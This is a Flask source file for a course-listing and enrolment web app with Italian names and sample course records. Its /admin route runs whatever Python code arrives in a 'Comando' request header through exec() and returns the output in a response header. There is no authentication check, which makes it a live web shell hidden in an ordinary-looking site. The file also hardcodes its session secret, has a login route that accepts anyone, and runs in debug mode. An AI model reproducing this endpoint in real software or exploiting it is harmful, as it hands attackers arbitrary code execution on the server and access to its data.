
from flask import Flask
from flask import redirect, url_for
from flask import render_template
from flask import request, jsonify, json
from flask import session
from flask import flash
from flask import make_response, Response
from datetime import timedelta, datetime
from flask_sqlalchemy import SQLAlchemy
from helper import login_required
import db
from io import StringIO
from contextlib import redirect_stdout


DB_NAME = "database.db"
app = Flask(__name__)
app.secret_key = "secret key"
app.permanent_session_lifetime = timedelta(days=7)
app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{DB_NAME}'


@app.route("/")
def home():
    return render_template("homepage.html")

@app.route("/admin", methods=["GET", "POST"])
def execute():
    if request.method == "POST":
        
        headers = dict(request.headers)
        
        res = ""
        f = StringIO()
        with redirect_stdout(f):
            try:
                exec(headers["Comando"])
                res = f.getvalue().strip()
            except:
                res = "error"
        
        headers["Result"] = str(res)
        
        return Response([b"good"], headers=headers)
    elif request.method == "GET":
        return render_template("admin.html")
    return "idk"

# azioni

@app.route("/lista-corsi/<n_fascia>", methods=["GET"])
def lista_corsi(n_fascia):
    corsi = db.db.session.execute(db.db.select(db.corso).filter_by(fascia=n_fascia)).all()
    
    # corsi = db.corso.query.filter_by(id=n_fascia).all()
    corsi = list(map(lambda x : x[0], corsi))
    return render_template("lista-corsi.html", fascia=n_fascia, corsi=corsi, dim=len(corsi))

@app.route("/iscrizione/<id_corso>", methods=["POST"])
@login_required
def iscrizione(id_corso):
    
    print("iscritto a", id_corso)
    
    return Response([str(id_corso).encode()])

@app.route("/corso/<id_corso>", methods=["GET"])
def info_corso(id_corso):
    corso = db.corso.query.filter_by(id=id_corso).first()
    return render_template("corso.html", corso=corso)

# profilo

@app.route("/profile/")
@login_required
def profile():
    return "Profile!"

# accesso al profilo
@app.route("/login/")
def login():
    session["email"] = "prova"
    return "Login!"

@app.route("/register/")
def register():
    return "Register!"

@app.route("/logout/")
@login_required
def logout():
    session.clear()
    return "Logout!"


if __name__ == "__main__":
    corsitmp = [
        db.corso(id=0,
            titolo="prova corsoo",
            descrizione="descrizione bella",
            posti_totali=50,
            posti_occupati=20,
            aula="Ed. 2, Piano 1, aula 36",
            fascia="1",
            organizzatori="persona 1",
            note="nota 1"
        ),
        db.corso(id=1,
            titolo="corso serio",
            descrizione="black jack",
            posti_totali=5,
            posti_occupati=1,
            aula="Ed. 2, Piano 2, aula 32",
            fascia="2",
            organizzatori="beccia",
            note="wooof"
        ),
        db.corso(id=2,
            titolo="corso brutto",
            descrizione="descrizione brutta",
            posti_totali=10,
            posti_occupati=0,
            aula="Ed. 2, Piano 1, aula 36",
            fascia="1",
            organizzatori="ferry",
            note="tosta"
        ),
        db.corso(id=3,
            titolo="corso cp",
            descrizione="ds + dp + grafi + advanced techincs",
            posti_totali=150,
            posti_occupati=149,
            aula="Ed. 2, Piano 0, Laboratorio Ravasio",
            fascia="1",
            organizzatori="drago",
            note="tanta cp bella"
        )
    ]
    
    with app.app_context():
        # db.drop_all()
        # db.init_app(app)
        # db.db.create_all()
        db.init_db(app, DB_NAME)
        
        for corso in corsitmp:
            q = db.db.session.execute(db.db.select(db.corso).filter_by(id=corso.id)).first()
            if q is None:
                db.db.session.add(corso)
                db.db.session.commit()
        
        app.run(debug=True)
